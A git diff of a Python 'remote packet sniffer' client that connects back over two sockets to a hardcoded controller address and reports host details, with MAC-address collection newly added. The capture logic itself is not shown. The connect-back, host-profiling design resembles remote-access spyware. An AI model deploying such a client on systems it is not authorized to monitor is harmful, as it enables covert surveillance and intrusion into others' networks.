@@ -1,6 +1,6 @@
 #Created by Vasto Boy
 
-#Disclaimer: This packet sniffer should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
+#Disclaimer: This remote packet sniffer should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
 import os
 import json
 import time
@@ -9,11 +9,12 @@ import datetime
 import platform
 import threading
 import subprocess
-from sniffer import SimpleSniffer
+from sniffer import RemoteSniffer
+from getmac import get_mac_address as gma
 
 
 
-class SimpleSnifferClient:
+class RemoteSnifferClient:
 
     def __init__(self, host, port1, port2):
         self.host = host
@@ -21,10 +22,10 @@ class SimpleSnifferClient:
         self.port2 = port2
         self.sock1 = None
         self.sock2 = None
-        self.sniffer = SimpleSniffer(self.host)
+        self.sniffer = RemoteSniffer(self.host)
 
 
-
+    #format text to bold and red 
     def convert_text_bold_red(self, text):
             RESET = "\033[0m"
             BOLD = "\033[1m"
@@ -40,11 +41,11 @@ class SimpleSnifferClient:
             try:
                 self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock1.connect((self.host, self.port1)) #connect back to server
-                print("[+]Connected")
+                print(f"[+]Session 1 has started on port {self.port1}")
 
                 self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock2.connect((self.host, self.port2)) #connect back to server
-                print("[+]Connected2")
+                print(f"[+]Session 2 has started on port {self.port2}")
                 break
 
             except socket.error as err:
@@ -143,12 +144,14 @@ class SimpleSnifferClient:
         sys_info = {
             "system": platform.uname().system,
             "node": platform.uname().node,
+            "mac_address": gma(),
             "release": platform.uname().release,
             "version": platform.uname().version,
             "machine": platform.uname().machine,
             "date_today": str(datetime.date.today()),
             "time_now": str(datetime.datetime.now().time())
         }
+        
         return sys_info
 
 
@@ -167,6 +170,6 @@ class SimpleSnifferClient:
 
 
 
-sniffer = SimpleSnifferClient("192.168.1.202", 5001, 5002)
+sniffer = RemoteSnifferClient("192.168.1.206", 5001, 5002)
 sniffer.start()
 
